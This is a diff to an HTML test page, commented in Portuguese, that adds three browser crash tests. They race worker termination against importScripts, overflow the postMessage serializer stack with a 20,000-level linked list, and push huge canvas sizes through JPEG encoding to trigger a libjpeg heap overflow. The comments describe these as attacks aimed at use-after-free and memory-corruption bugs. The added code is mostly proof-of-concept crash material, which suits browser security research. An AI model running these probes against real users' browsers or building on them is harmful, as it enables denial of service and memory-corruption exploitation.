@@ -33,7 +33,11 @@
 	<button onclick="runAudioRace()">TEST 1: AudioContext Thread Race (Use-After-Free)</button>
     <button onclick="runWorkerTermination()">TEST 2: Worker Terminate Transfer Race</button>
     <button onclick="runLargeArrayOverflow()">TEST 3: Large Array Buffer Overflow</button>
+    <button onclick="runImportRace()">TEST 1: Worker importScripts Termination Race</button>
+    <button onclick="runPostMessageRecursion()">TEST 2: MessagePort Serializer Stack Smash</button>
+    <button onclick="runJPEGOverflow()">TEST 3: Canvas JPEG Encoder Heap Overflow</button>
 
+	
     <div id="log">Status: Aguardando testes...</div>
     <canvas id="c" width="100" height="100"></canvas>
     
@@ -602,10 +606,124 @@ function log(msg) {
                 }
             });
             log("Teste de Alocação finalizado.");
-        }
+		}
 		
+
+    
+
+        // --- TESTE 1: Worker importScripts Termination Race ---
+        // Tenta matar o worker enquanto ele carrega e compila um script pesado.
+        function runImportRace() {
+            log("Iniciando ImportScripts Race...");
+            
+            // Cria um script "pesado" para importar
+            const heavyScript = "Math.random();".repeat(10000);
+            const scriptBlob = new Blob([heavyScript], {type: 'text/javascript'});
+            const scriptUrl = URL.createObjectURL(scriptBlob);
+            
+            const workerCode = `
+                self.onmessage = function(e) {
+                    // Inicia importação síncrona pesada
+                    importScripts(e.data);
+                    postMessage("Done");
+                };
+            `;
+            const blob = new Blob([workerCode], {type: 'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                count++;
+                if (count > 50) {
+                    clearInterval(interval);
+                    log("Teste finalizado (Sem crash).");
+                    return;
+                }
+
+                const w = new Worker(url);
+                w.postMessage(scriptUrl);
+                
+                // O GOLPE: Termina o worker num tempo aleatório durante o import
+                const killTime = Math.random() * 20;
+                setTimeout(() => {
+                    w.terminate();
+                }, killTime);
+                
+                if (count % 10 === 0) log("Ciclo " + count + " executado.");
+            }, 50);
+        }
+
+        // --- TESTE 2: MessagePort Serializer Stack Smash ---
+        // Cria uma lista ligada profunda e tenta enviar via IPC.
+        // Estoura a pilha de recursão do serializador.
+        function runPostMessageRecursion() {
+            log("Iniciando Serializer Stack Smash...");
+            
+            try {
+                let root = { next: null };
+                let current = root;
+                
+                // Cria uma profundidade de 20.000 níveis
+                // O serializador C++ usa recursão para percorrer objetos
+                for (let i = 0; i < 20000; i++) {
+                    current.next = { val: i, next: null };
+                    current = current.next;
+                }
+                
+                log("Objeto profundo criado. Enviando via postMessage...");
+                
+                const channel = new MessageChannel();
+                // O crash deve ocorrer AQUI, durante a serialização para envio
+                channel.port1.postMessage(root);
+                
+                log("Envio concluído (Stack aguentou).");
+                
+            } catch(e) {
+                // "Maximum call stack size exceeded" é JS catch.
+                // Crash direto é C++ catch falhando.
+                log("Erro: " + e.message);
+            }
+        }
+
+        // --- TESTE 3: Canvas JPEG Encoder Heap Overflow ---
+        // Cria uma imagem com dimensões específicas e tenta codificar para JPEG.
+        // Tenta explorar falhas no cálculo de buffer do libjpeg.
+        function runJPEGOverflow() {
+            log("Iniciando JPEG Encoder Attack...");
+            
+            const canvas = document.getElementById('c');
+            const ctx = canvas.getContext('2d');
+            
+            // Dimensões "estranhas" que podem causar problemas de alinhamento ou overflow
+            const targets = [
+                { w: 65500, h: 1 },    // Linha muito larga (perto de uint16)
+                { w: 1, h: 65500 },    // Coluna muito alta
+                { w: 32768, h: 32768 } // Limite 1GB pixels
+            ];
+
+            targets.forEach((t, i) => {
+                setTimeout(() => {
+                    try {
+                        log(`Tentativa ${i}: ${t.w}x${t.h}...`);
+                        canvas.width = t.w;
+                        canvas.height = t.h;
+                        
+                        // Preenche com ruído para dificultar compressão
+                        // (Pula para ganhar performance, só precisamos de dados)
+                        ctx.fillStyle = "red";
+                        ctx.fillRect(0, 0, t.w, t.h);
+                        
+                        // O GOLPE: toDataURL força a compressão síncrona ou assíncrona
+                        const data = canvas.toDataURL('image/jpeg', 1.0);
+                        
+                        log("Codificação concluída (Length: " + data.length + ")");
+                    } catch(e) {
+                        log("Erro (Browser Protegeu): " + e.message);
+                    }
+                }, i * 1000);
+            });
+        }
 
     </script>
 </body>
 </html>
-
